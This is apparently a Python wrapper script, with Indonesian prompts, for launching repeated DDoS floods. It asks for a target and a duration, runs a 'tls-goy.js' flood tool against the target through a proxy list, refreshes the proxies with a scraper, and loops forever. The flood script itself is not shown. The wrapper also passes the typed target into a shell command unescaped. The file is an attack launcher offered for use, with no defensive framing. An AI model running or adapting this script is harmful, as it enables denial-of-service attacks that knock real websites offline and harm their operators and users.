import subprocess
import time
from datetime import datetime

def run_script(target, time_duration):
    while True:
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        print(f"[{current_time}] Running tls-goy for {time_duration} seconds...")
        cf_command = f"node tls-goy.js {target} {time_duration} 64 4 proxy.txt"
        subprocess.run(cf_command, shell=True)
        print(f"[{current_time}] tls-goy finished for {time_duration} seconds. Waiting for next run...")
        
        print(f"[{current_time}] Running proxyscraper.py...")
        proxy_command = "python3 proxyscraper.py"
        subprocess.run(proxy_command, shell=True)
        print(f"[{current_time}] proxyscraper.py")

        time.sleep(10)

if __name__ == "__main__":
    target = input("Masukkan target: ")  
    duration = int(input("Masukkan durasi waktu (dalam detik): "))
    
    run_script(target, duration)